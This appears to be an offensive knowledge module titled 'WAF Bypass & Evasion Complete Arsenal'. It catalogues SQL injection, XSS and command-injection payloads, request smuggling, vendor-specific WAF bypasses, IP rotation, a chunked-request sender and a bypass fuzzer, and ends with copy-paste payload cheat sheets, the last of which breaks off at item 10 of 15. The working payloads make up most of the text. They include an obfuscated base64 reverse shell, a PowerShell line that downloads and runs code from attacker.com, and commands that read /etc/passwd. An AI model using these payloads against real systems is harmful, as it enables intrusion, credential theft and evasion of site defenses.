# WAF Bypass & Evasion Complete Arsenal

> Bxploit (bx) knowledge module — WAF detection, fingerprinting, and bypass techniques for all major WAF vendors and injection classes.

**Disclaimer:** For authorized penetration testing and educational purposes only.

---

## 1. WAF Detection & Fingerprinting

Before bypassing, identify the WAF in play.

```bash
# wafw00f — primary WAF fingerprinter
wafw00f https://target.com -a

# nmap WAF detection
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com

# manual fingerprint via response headers
curl -sI https://target.com | grep -iE 'server|x-powered|x-cdn|cf-ray|x-sucuri|x-akamai|x-amz|x-mod-sec'

# trigger WAF and observe block page
curl -s "https://target.com/?id=1' OR 1=1--" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/<script>alert(1)</script>" -D -

# identify Cloudflare by cf-ray header and __cfduid cookie
curl -sI https://target.com | grep -i 'cf-ray'

# identify Akamai by AkamaiGHost or X-Akamai-Transformed
curl -sI https://target.com | grep -i 'akamai'

# identify AWS WAF by x-amzn-requestid or x-amz-cf-id
curl -sI https://target.com | grep -i 'x-amz'

# identify ModSecurity by Server header or error page pattern
curl -s "https://target.com/?test=<script>" | grep -i 'mod_security\|modsec'
```

---

## 2. SQL Injection WAF Bypass

### 2.1 Case Manipulation & Mixed Case

```
# standard payload blocked:
' OR 1=1--

# mixed case bypass:
' oR 1=1--
' Or 1=1--
' OR 1=1--
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT nUlL,nUlL,nUlL--
```

### 2.2 Comment Insertion (Inline Comments)

```sql
# MySQL inline comment bypass — breaks keyword signature matching
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
UN/**/ION SE/**/LECT 1,2,3--
UNI%0bON SEL%0bECT 1,2,3--

# nested comments
/*/**/UNION/**/*/SELECT 1,2,3--

# version-conditional comments (MySQL only)
' /*!00000UnIoN*/ /*!00000SeLeCt*/ 1,user(),3--
' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--
```

### 2.3 Whitespace Substitution

```sql
# replace spaces with alternatives
'%09UNION%09SELECT%091,2,3--          # horizontal tab
'%0aUNION%0aSELECT%0a1,2,3--        # newline
'%0bUNION%0bSELECT%0b1,2,3--        # vertical tab
'%0cUNION%0cSELECT%0c1,2,3--        # form feed
'%0dUNION%0dSELECT%0d1,2,3--        # carriage return
'%a0UNION%a0SELECT%a01,2,3--         # non-breaking space (MySQL)
'+UNION+SELECT+1,2,3--               # plus sign as space
'/**/UNION/**/SELECT/**/1,2,3--      # comment as space
```

### 2.4 Double Encoding

```
# single URL encoding (often caught)
%27%20OR%201%3D1--

# double URL encoding
%2527%2520OR%25201%253D1--

# triple encoding (rare but works on misconfigured reverse proxies)
%252527%252520OR%2525201%25253D1--

# mixed encoding
%27 OR 1%3D1--
```

### 2.5 Unicode & UTF-8 Overlong Encoding

```
# Unicode normalization bypass
＇ OR 1=1--                        # fullwidth apostrophe U+FF07
ʼ OR 1=1--                        # modifier letter apostrophe U+02BC

# UTF-8 overlong encoding for single quote (')
%c0%27                            # 2-byte overlong for 0x27
%c0%a7                            # alternative 2-byte overlong
%e0%80%a7                         # 3-byte overlong

# IIS-specific Unicode bypass
%u0027 OR 1=1--                   # IIS Unicode encoding for '
%u02b9 OR 1=1--                   # modifier letter prime
```

### 2.6 Alternative SQL Syntax

```sql
# avoid UNION SELECT entirely
' OR 1=1 ORDER BY 1--
' AND 1=2 UNION ALL SELECT 1,2,3--

# HAVING / GROUP BY error-based without UNION
' GROUP BY column_name HAVING 1=1--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

# no spaces, no commas (extreme bypass)
'AND(SELECT(1)FROM(SELECT(COUNT(*)),CONCAT((SELECT(database())),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--

# substring without SUBSTR keyword
' AND MID(user(),1,1)='r'--
' AND LEFT(user(),1)='r'--
' AND LPAD(user(),1,1)='r'--

# LIKE-based extraction
' AND user() LIKE 'r%'--

# no-comma UNION bypass (MySQL)
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

# BETWEEN instead of comparison operators
' AND 1 BETWEEN 1 AND 1--

# boolean without OR/AND keywords
' | 1=1#
' & 1=1#
' ^ 0#
' DIV 0#
' XOR 1#
```

### 2.7 String Concatenation Bypass

```sql
# MySQL
CONCAT('sel','ect')
'sel' 'ect'                  # adjacent string literal concat
0x73656c656374               # hex for 'select'

# PostgreSQL
'sel'||'ect'
CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116)

# MSSQL
'sel'+'ect'
CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)

# Oracle
'sel'||'ect'
CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116)
```

### 2.8 Hex / Char Encoding

```sql
# hex-encode entire strings (MySQL)
SELECT 0x61646d696e           # = 'admin'
' UNION SELECT 1,0x61646d696e,3--

# CHAR() encoding
' UNION SELECT 1,CHAR(97,100,109,105,110),3--

# CONV() number base tricks
CONV(10,10,36)                # = 'a'
CONV(11,10,36)                # = 'b'
```

### 2.9 SQLMap Tamper Scripts (Automated Bypass)

```bash
# essential tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=charencode
sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode
sqlmap -u "http://target.com/page?id=1" --tamper=equaltolike
sqlmap -u "http://target.com/page?id=1" --tamper=space2hash
sqlmap -u "http://target.com/page?id=1" --tamper=space2morehash
sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlblank
sqlmap -u "http://target.com/page?id=1" --tamper=percentage
sqlmap -u "http://target.com/page?id=1" --tamper=modsecurityversioned

# chain multiple tampers for aggressive bypass
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=2 --level=5 --risk=3

# specific WAF tamper chains
# Cloudflare:
sqlmap --tamper=between,charencode,charunicodeencode,equaltolike,space2comment,randomcase

# ModSecurity:
sqlmap --tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,charencode

# AWS WAF:
sqlmap --tamper=space2comment,charencode,randomcase,between
```

---

## 3. XSS WAF Bypass

### 3.1 Tag & Event Handler Alternatives

```html
<!-- standard blocked -->
<script>alert(1)</script>

<!-- alternative tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
<isindex action="javascript:alert(1)" type=image>

<!-- lesser-known event handlers -->
<div onpointerover=alert(1)>hover</div>
<div onmouseover=alert(1)>hover</div>
<div ontouchstart=alert(1)>touch</div>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)>
<input type=image src=x onerror=alert(1)>
<xss id=x onfocus=alert(1) tabindex=1>#x
```

### 3.2 JavaScript Execution Without Parentheses

```html
<!-- backtick template literals instead of parentheses -->
<img src=x onerror=alert`1`>

<!-- throw + onerror -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- location assignment -->
<img src=x onerror="location='javascript:alert(1)'">

<!-- eval alternatives -->
<img src=x onerror="self[`al`+`ert`](1)">
<img src=x onerror="top[`al`+`ert`](1)">
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="this['al'+'ert'](1)">

<!-- constructor chain -->
<img src=x onerror="[].constructor.constructor('alert(1)')()">
<img src=x onerror="Function`a]alert${1}[a```">

<!-- import() -->
<img src=x onerror="import('data:text/javascript,alert(1)')">
```

### 3.3 Encoding Bypass for XSS

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- HTML entity without semicolons -->
<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>

<!-- JavaScript Unicode escapes -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- base64 in eval -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- String.fromCharCode -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

<!-- JSFuck-style minimal charset -->
<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</script>

<!-- data: URI -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>

<!-- javascript: URI with encoding -->
<a href="java&#x09;script:alert(1)">click</a>
<a href="j&#x61;vascript:alert(1)">click</a>
<a href="&#x6a;avascript:alert(1)">click</a>
```

### 3.4 DOM-Based XSS Payloads (Bypass Server WAF Entirely)

```javascript
// these payloads never hit the server WAF — they execute client-side
// fragment-based (not sent to server)
https://target.com/page#<img src=x onerror=alert(1)>

// DOM clobbering
<form id=x><input name=y value="<img src=x onerror=alert(1)>"></form>

// prototype pollution leading to XSS
constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
```

### 3.5 Polyglot XSS Payloads

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%0telerik%0telerik%0telerik%0telerik%0telerik%0Atelerik%0telerik%0telerik%0d%0n*/<telerik>%0d%0a*/prompt()//<svg ""onload=alert()//

';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

"><img src=x onerror=alert(1)//
"><svg/onload=alert(1)//
'"><img src=x onerror=prompt(1);>
```

---

## 4. Command Injection WAF Bypass

### 4.1 Separator & Substitution

```bash
# standard separators (often caught)
; ls
| ls
& ls
&& ls
|| ls

# newline injection
%0als
%0d%0als

# backtick substitution
`ls`
$(ls)

# bypassing space filters
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
IFS=,;`cat<<<cat,/etc/passwd`

# bypassing keyword blacklists
# cat → alternatives
tac /etc/passwd
nl /etc/passwd
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd | xxd -r
base64 /etc/passwd | base64 -d
dd if=/etc/passwd

# string splitting with quotes
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# variable-based evasion
a=c;b=at;$a$b /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd

# wildcard-based
/???/??t /etc/passwd         # /bin/cat
/???/???/???s??              # /usr/bin/passwd
```

### 4.2 Reverse Shell Command Obfuscation

```bash
# base64-encoded reverse shell
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE= | base64 -d | bash

# hex-encoded
echo 6261736820 | xxd -r -p

# $() nesting
$($(echo c2g=|base64 -d))

# heredoc technique
cat <<< "$(echo YmFzaCAtaQ== | base64 -d)"

# brace expansion
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=}|{base64,-d}|bash
```

### 4.3 PowerShell (Windows) Obfuscation

```powershell
# tick insertion
i`E`x(iwr http://attacker.com/payload)

# concatenation
&('I'+'EX')(('Ne'+'w-Ob'+'ject'))

# env variable manipulation
cmd /V /C "set x=whoami&& !x!"

# encoding
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hvYW1p'))

# caret insertion (cmd.exe)
w^h^o^a^m^i
p^o^w^e^r^s^h^e^l^l
```

---

## 5. HTTP-Level Bypass Techniques

### 5.1 Chunked Transfer Encoding

WAFs that inspect the full body may fail when the body is chunked.

```http
POST /vulnerable HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

4
id=1
5
' UNI
7
ON SEL
9
ECT 1,2
3
,3-
2
-
0

```

```python
# Python script to send chunked SQLi payload
import socket

host = "target.com"
port = 80
payload_parts = ["id=1", "' UNI", "ON SEL", "ECT 1,2", ",3-", "-"]

req = f"POST /page HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
for part in payload_parts:
    req += f"{len(part):x}\r\n{part}\r\n"
req += "0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req.encode())
print(s.recv(4096).decode())
s.close()
```

### 5.2 HTTP Parameter Pollution (HPP)

```
# duplicate parameter — different backends pick different values
# ASP.NET/IIS: concatenates with comma → id=1, UNION SELECT 1,2,3
?id=1&id=' UNION SELECT 1,2,3--

# PHP/Apache: uses last value
?id=safe_value&id=' OR 1=1--

# JSP/Tomcat: uses first value
?id=' OR 1=1--&id=safe_value

# HPP in forms
<form>
  <input name="id" value="safe">
  <input name="id" value="' OR 1=1--">
</form>

# array parameter confusion
?id[]=1&id[]=2 UNION SELECT 1,2,3--

# mixed GET/POST — some WAFs only inspect GET
# send clean GET, malicious POST
curl -X POST "https://target.com/page?id=1" -d "id=' OR 1=1--"
```

### 5.3 HTTP Request Smuggling

```http
# CL.TE smuggling (front-end uses Content-Length, back-end uses Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# TE.CL smuggling (front-end uses Transfer-Encoding, back-end uses Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE smuggling — obfuscate Transfer-Encoding header
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: identity, chunked
```

```bash
# smuggler — automated request smuggling detector
python3 smuggler.py -u https://target.com

# using curl for manual CL.TE detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

### 5.4 Header Injection Bypass

```http
# X-Forwarded-For to bypass IP-based WAF rules
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
X-Azure-ClientIP: 127.0.0.1
X-Azure-SocketIP: 127.0.0.1

# Host header manipulation
Host: target.com
X-Forwarded-Host: localhost

# Content-Type confusion
Content-Type: application/json         # send SQL in JSON
Content-Type: text/xml                 # WAF may not inspect XML body
Content-Type: multipart/form-data      # different parser, different rules
Content-Type: application/x-www-form-urlencoded; charset=ibm037

# charset/encoding confusion
Content-Type: application/x-www-form-urlencoded; charset=utf-7
Content-Type: application/x-www-form-urlencoded; charset=utf-16
Content-Type: application/x-www-form-urlencoded; charset=shift_jis

# HTTP method override (bypass method-based rules)
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method: PUT
```

### 5.5 Path / URL Bypass

```
# path normalization differences between WAF and backend
/api/v1/users → blocked
/api/v1/./users → bypass
/api/v1/users/. → bypass
/api//v1//users → bypass
/api/v1/users%00 → null byte truncation
/api/v1/users%20 → trailing space
/api/v1/us%65rs → URL-encoded path
/API/V1/USERS → case difference
/api/v1;/users → semicolon path parameter (Tomcat)
/api/v1/..;/admin → Tomcat-specific traversal
```

---

## 6. Vendor-Specific WAF Bypasses

### 6.1 Cloudflare Bypass

```
# SQLi bypass techniques for Cloudflare
' /*!50000AND*/ 1=1--
' AND/**/ 1=1--
' %26%26 1=1--

# XSS bypass for Cloudflare (as of known bypasses)
<svg/onload=self[`aler`%2b`t`]`1`>
<img src=x onerror="window['al'+'ert'](1)">
<svg onload=location='jav'+'ascript:'+'ale'+'rt(1)'>

# origin IP discovery (bypass CDN entirely)
# DNS history
curl -s "https://securitytrails.com/domain/target.com/dns"
# certificate search
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].common_name'
# Shodan search
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str
# censys
censys search "services.tls.certificates.leaf.subject.common_name: target.com"
# direct IP connection once found
curl -k -H "Host: target.com" https://<origin-ip>/
```

### 6.2 Akamai / Kona WAF Bypass

```
# Akamai frequently blocks based on payload score
# distributed payload across parameters
?q=1&q2=UNION&q3=SELECT&q4=1,2,3

# double-encoding works against some Akamai rules
%252f%252e%252e%252f → /../

# Akamai XSS bypass
<d3v/oNPointerOver=confirm`XSS`>hover here
<svg%0Aonload=prompt(1)>

# large body padding — exceed Akamai inspection buffer
?id=1' AND 1=1-- AAAA...[>8KB of padding]...AAAA
```

### 6.3 AWS WAF Bypass

```
# AWS WAF has configurable rule groups — each has blind spots
# JSON body injection (if WAF only inspects form-encoded)
curl -X POST https://target.com/api -H "Content-Type: application/json" \
  -d '{"id":"1 UNION SELECT 1,2,3--"}'

# unicode normalization
?id=1%ef%bc%87+OR+1%ef%bc%9d1--     # fullwidth quotes

# multi-value header exploit
# AWS WAF may only inspect first or last header value
curl -H "X-Custom: safe" -H "X-Custom: ' OR 1=1--" https://target.com/

# size limit bypass — AWS WAF has body size inspection limits
# default: first 8 KB for regional, first 16 KB for CloudFront
# pad payload beyond that threshold
python3 -c "print('A'*8200 + \"' OR 1=1--\")"
```

### 6.4 ModSecurity CRS Bypass

```
# ModSecurity Core Rule Set paranoia level determines strictness
# PL1 (default) bypasses:
' /*!00000Union*/ /*!00000Select*/ 1,2,3--
' union%23%0aselect 1,2,3--
' union%23foo%0aselect 1,2,3--

# comment-based keyword split
' UN%49ON SEL%45CT 1,2,3--     # embedded URL-encoded chars

# PL2 bypasses (require more creativity):
-1'<1 oR 3+1>2+1--

# PL3+ typically needs chaining multiple evasion techniques
# e.g., combine Unicode + comment + whitespace

# ModSec SecRule exclusion via header
# some configs exclude paths or IPs from inspection
X-Security-Token: bypass_token_if_configured

# ModSec anomaly score — stay under threshold
# PL1 threshold = 5, PL2 = 3, PL3/4 = 0
# single-char injection probes to detect threshold
```

---

## 7. IP Rotation & Rate Limit Bypass

### 7.1 IP Rotation

```bash
# tor rotation
curl --socks5 127.0.0.1:9050 https://target.com/
# force new circuit
curl --socks5 127.0.0.1:9050 --socks5-hostname 127.0.0.1:9050 https://target.com/

# proxychains rotation
proxychains4 -f /etc/proxychains4.conf curl https://target.com/
# config: chain_len = 2, random_chain

# cloud function rotation (each invocation = new IP)
# AWS Lambda, GCP Cloud Functions, Azure Functions

# residential proxy rotation
curl -x http://user:pass@rotating.proxy:port https://target.com/

# custom per-request proxy with sqlmap
sqlmap -u "http://target.com/?id=1" --proxy="socks5://127.0.0.1:9050" --tor --tor-type=SOCKS5 --check-tor
```

### 7.2 Rate Limit Bypass

```
# IP header spoofing (if trusted by server)
X-Forwarded-For: <random_ip>

# randomize user-agent per request
curl -A "$(shuf -n1 /usr/share/seclists/Discovery/Web-Content/UserAgents.fuzz.txt)" https://target.com/

# add jitter/delay between requests
sqlmap -u "http://target.com/?id=1" --delay=3 --random-agent

# case/encoding variation to appear as different requests
/api/login  vs  /API/LOGIN  vs  /api/./login  vs  /api%2flogin

# null byte in parameters to evade dedup
?username=admin%00_$(date +%s)&password=test

# HTTP/2 multiplexing to avoid per-connection rate limits
# h2load or hyper can send parallel streams in one connection
```

---

## 8. Payload Obfuscation Techniques

### 8.1 Universal Obfuscation Methods

```
# null byte insertion (classic, still works on some stacks)
sel%00ect
uni%00on

# buffer overflow the WAF regex engine
?id=1 AND (SELECT 1)=(SELECT 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...repeat 1000+...AAAA) UNION SELECT 1,2,3--

# HTTP/0.9 (no headers, raw response — very old servers)
GET /page?id=' OR 1=1-- HTTP/0.9

# multipart boundary manipulation
Content-Type: multipart/form-data; boundary=----AAAA
Content-Type: multipart/form-data; boundary=----AAAA; charset=utf-7

# line folding in headers (deprecated in HTTP/1.1 but still parsed)
X-Custom: safe\r\n value: malicious

# request line without spaces
GET/page?id=1'+OR+1=1--+HTTP/1.1
```

### 8.2 JSON & XML Payload Smuggling

```json
// JSON comment injection (nonstandard but parsed by some backends)
{"id": "1' UNION SELECT 1,2,3--"/* comment */}

// JSON Unicode escape
{"id": "1\u0027 OR 1=1--"}

// deeply nested JSON to exceed WAF parse depth
{"a":{"b":{"c":{"d":{"e":{"f":{"id":"1' OR 1=1--"}}}}}}}
```

```xml
<!-- XML entity expansion -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "' OR 1=1--">
]>
<root><id>&xxe;</id></root>

<!-- CDATA bypass -->
<root><id><![CDATA[' OR 1=1--]]></id></root>

<!-- XML comment splitting -->
<root><id>1' <!--bypass--> OR 1=1--</id></root>
```

### 8.3 Encoding Cheat Sheet

| Technique | Example | Use Case |
|-----------|---------|----------|
| URL encoding | `%27` for `'` | Basic bypass |
| Double URL encoding | `%2527` for `'` | Proxy chain bypass |
| Unicode encoding | `%u0027` for `'` | IIS bypass |
| HTML entity (decimal) | `&#39;` for `'` | XSS context |
| HTML entity (hex) | `&#x27;` for `'` | XSS context |
| UTF-7 | `+ACc-` for `'` | Content-Type charset bypass |
| UTF-16 | `%ff%fe%27%00` | Charset confusion |
| Overlong UTF-8 | `%c0%a7` for `'` | Legacy parser bypass |
| Base64 | `Jw==` for `'` | Eval/atob context |
| IBM037 (EBCDIC) | `%7D` for `'` | Content-Type charset bypass |

---

## 9. Advanced Evasion Patterns

### 9.1 Time-Based & Condition-Based Bypass

```sql
# time-based without SLEEP keyword
' AND BENCHMARK(10000000,SHA1('test'))--              # MySQL
' AND (SELECT count(*) FROM generate_series(1,10000000))--  # PostgreSQL
' WAITFOR DELAY '0:0:5'--                              # MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--             # Oracle

# conditional without IF keyword (MySQL)
' AND CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--
' AND ELT(1=1,SLEEP(5))--
```

### 9.2 Second-Order / Stored Payload Injection

```
# WAF inspects input at entry but not when retrieved/used later
# register username: admin'--
# login triggers: SELECT * FROM users WHERE username='admin'--'

# file upload with payload in filename
filename="test'; DROP TABLE users;--.jpg"
# metadata injection (EXIF)
exiftool -Comment="<script>alert(1)</script>" image.jpg
```

### 9.3 Protocol-Level Bypass

```bash
# HTTP/2 binary framing — WAF may not reassemble correctly
# use h2c (HTTP/2 cleartext) upgrade if supported
curl --http2 https://target.com/page?id=1'+OR+1=1--

# WebSocket upgrade — WAF may not inspect WS frames
# inject via WS after upgrade
websocat ws://target.com/ws
{"query": "1' OR 1=1--"}

# gRPC — binary protocol, most WAFs can't inspect
# if backend accepts gRPC, send malicious protobuf

# compress payload body — WAF may not decompress
curl -X POST https://target.com/ \
  -H "Content-Encoding: gzip" \
  --data-binary @<(echo -n "id=1' OR 1=1--" | gzip)

# pipeline HTTP/1.1 requests
printf 'GET /safe HTTP/1.1\r\nHost: target.com\r\n\r\nGET /page?id=1%%27+OR+1=1-- HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80
```

### 9.4 Content-Type & Body Format Switching

```bash
# if endpoint accepts multiple content types, switch format
# WAF may only inspect application/x-www-form-urlencoded

# JSON body
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"id":"1'\'' OR 1=1--"}'

# XML body
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<request><id>1&apos; OR 1=1--</id></request>'

# multipart
curl -X POST https://target.com/api \
  -F "id=1' OR 1=1--"

# EBCDIC encoding (IBM037)
curl -X POST https://target.com/api \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  --data-binary "$(echo 'id=1 OR 1=1--' | iconv -t ibm037)"
```

---

## 10. Automation & Tooling

### 10.1 Bypass Testing Tools

```bash
# WAFNinja — WAF bypass testing
python3 wafninja.py fuzz -u "https://target.com/page?id=FUZZ" -t xss -o output.html

# WhatWaf — detect & bypass WAFs
whatwaf -u "https://target.com/?id=1" --tamper

# bypass-firewalls-by-DNS-history
python3 bypass-firewalls-by-DNS-history.py -d target.com

# w3af WAF evasion plugin
w3af_console
plugins audit sqli
plugins evasion rnd_case,rnd_hex_encode
target set target https://target.com/
start

# Burp Suite extensions
# - Turbo Intruder (fast fuzzing)
# - Param Miner (hidden parameter discovery)
# - HTTP Request Smuggler (automated smuggling)
# - Hackvertor (encoding/decoding chains)
```

### 10.2 Custom Python WAF Bypass Fuzzer

```python
#!/usr/bin/env python3
"""Minimal WAF bypass fuzzer — test encoding variants against a target parameter."""

import requests
import urllib.parse
import itertools

TARGET = "https://target.com/page"
PARAM = "id"
BASE_PAYLOAD = "' OR 1=1--"

ENCODERS = {
    "plain": lambda s: s,
    "url": lambda s: urllib.parse.quote(s),
    "double_url": lambda s: urllib.parse.quote(urllib.parse.quote(s)),
    "unicode_fullwidth": lambda s: ''.join(
        chr(0xFEE0 + ord(c)) if 0x21 <= ord(c) <= 0x7E else c for c in s
    ),
    "mixed_case": lambda s: ''.join(
        c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)
    ),
    "comment_split": lambda s: s.replace(" ", "/**/"),
    "tab_space": lambda s: s.replace(" ", "\t"),
    "newline_split": lambda s: s.replace(" ", "%0a"),
    "concat_hex": lambda s: '0x' + s.encode().hex(),
}

HEADERS_BYPASS = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Content-Type": "application/x-www-form-urlencoded; charset=utf-7"},
]

def test_bypass():
    for enc_name, encoder in ENCODERS.items():
        for hdrs in HEADERS_BYPASS:
            encoded = encoder(BASE_PAYLOAD)
            try:
                r = requests.get(TARGET, params={PARAM: encoded}, headers=hdrs, timeout=10, verify=False)
                status = r.status_code
                blocked = status in (403, 406, 429, 503) or "blocked" in r.text.lower() or "forbidden" in r.text.lower()
                marker = "BLOCKED" if blocked else "PASSED"
                print(f"[{marker}] {status} | {enc_name} | headers={bool(hdrs)} | payload={encoded[:80]}")
            except Exception as e:
                print(f"[ERROR] {enc_name}: {e}")

if __name__ == "__main__":
    test_bypass()
```

---

## 11. Quick Reference — Bypass Decision Tree

```
1. Detect WAF → wafw00f / nmap / manual header check
2. Identify vendor → Cloudflare / Akamai / AWS / ModSecurity / generic
3. Try basic bypass:
   a. Mixed case → ' oR 1=1--
   b. Comment insertion → UN/**/ION SEL/**/ECT
   c. Whitespace sub → %09, %0a, %0c
   d. Double encoding → %2527
4. If still blocked:
   a. HPP → duplicate params
   b. Chunked TE → split payload across chunks
   c. Content-Type switch → JSON, XML, multipart
   d. Charset confusion → utf-7, ibm037
5. If still blocked:
   a. Request smuggling → CL.TE / TE.CL
   b. HTTP/2 downgrade/upgrade
   c. Origin IP discovery → bypass CDN entirely
   d. Body size overflow → exceed WAF inspection buffer
6. Automate → sqlmap tampers, custom fuzzer, Burp extensions
```

---

## 12. Payload Cheat Sheet — Copy-Paste Ready

### SQL Injection (Top 15 WAF-Evasion Payloads)

```
1.  ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
2.  ' uNiOn%23%0a SeLeCt 1,2,3--
3.  ' AND 1=2 UNION ALL%23%0aSELECT 1,2,3--
4.  -1' UNION SELECT 1,2,3 INTO @a,@b,@c--
5.  ' OR MID(user(),1,1) LIKE 'r'--
6.  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
7.  ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
8.  1' AND 1=(UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1))--
9.  ' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT version())c--
10. '%0bAND%0b1=1--
11. ' /*!00000OR*/ 1=1--
12. ' %26%26 1=1--
13. '+(select+1+from+dual+where+1=1)+'
14. ' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--
15. ' OR 1 BETWEEN 1 AND 1--
```

### XSS (Top 15 WAF-Evasion Payloads)

```
1.  <svg/onload=alert`1`>
2.  <img src=x onerror=self['al'+'ert'](1)>
3.  <details open ontoggle=alert(1)>
4.  <math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
5.  <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
6.  <svg onload=location='jav'%2b'ascript:'%2b'ale'%2b'rt(1)'>
7.  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
8.  <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
9.  <img src=x onerror=[].constructor.constructor('alert(1)')()>
10. <marquee onstart=alert(1)>
